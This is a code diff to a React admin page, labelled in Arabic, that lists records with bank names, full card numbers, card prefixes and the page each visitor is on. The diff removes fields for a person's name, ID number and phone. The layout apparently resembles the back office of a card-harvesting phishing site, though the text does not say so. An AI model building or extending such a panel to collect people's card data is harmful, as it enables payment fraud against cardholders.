@@ -36,11 +36,6 @@ interface Notification {
   currentPage: string;
   createdDate: string;
   notificationCount: number;
-  personalInfo?: {
-    id: string;
-    fullName: string;
-    phone: string;
-  };
   bank: string;
   cardNumber: string;
   prefix: string;
@@ -213,7 +208,6 @@ export default function NotificationsPage1() {
               {notifications.map((notification) => (
                 <tr key={notification.id} className="border-b border-gray-700">
                   <td className="px-4 py-3">
-                    {notification!.personalInfo!.fullName}
                   </td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
@@ -256,9 +250,9 @@ export default function NotificationsPage1() {
                   </td>{' '}
                   <td className="px-4 py-3 text-center">
                     <Badge variant="default" className="bg-green-500">
-                      {Number.parseInt(
+                      {
                         notification!.notificationCount!.toString()!
-                      )}
+                      }
                     </Badge>
                   </td>
                   <td className="px-4 py-3 text-center">
@@ -292,23 +286,6 @@ export default function NotificationsPage1() {
                 : 'تفاصيل معلومات البطاقة'}
             </DialogDescription>
           </DialogHeader>
-          {selectedInfo === 'personal' &&
-            selectedNotification?.personalInfo && (
-              <div className="space-y-2">
-                <p>
-                  <strong>الاسم الكامل:</strong>{' '}
-                  {selectedNotification.personalInfo.fullName}
-                </p>
-                <p>
-                  <strong>رقم الهوية:</strong>{' '}
-                  {selectedNotification.personalInfo.id}
-                </p>
-                <p>
-                  <strong>رقم الهاتف:</strong>{' '}
-                  {selectedNotification.personalInfo.phone}
-                </p>
-              </div>
-            )}
           {selectedInfo === 'card' && selectedNotification && (
             <div className="space-y-2">
               <p>
@@ -319,7 +296,7 @@ export default function NotificationsPage1() {
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
                 {selectedNotification.cardNumber &&
-                  selectedNotification.cardNumber}
+                  selectedNotification.cardNumber!}
                 - {selectedNotification.prefix}
               </p>
               <p>
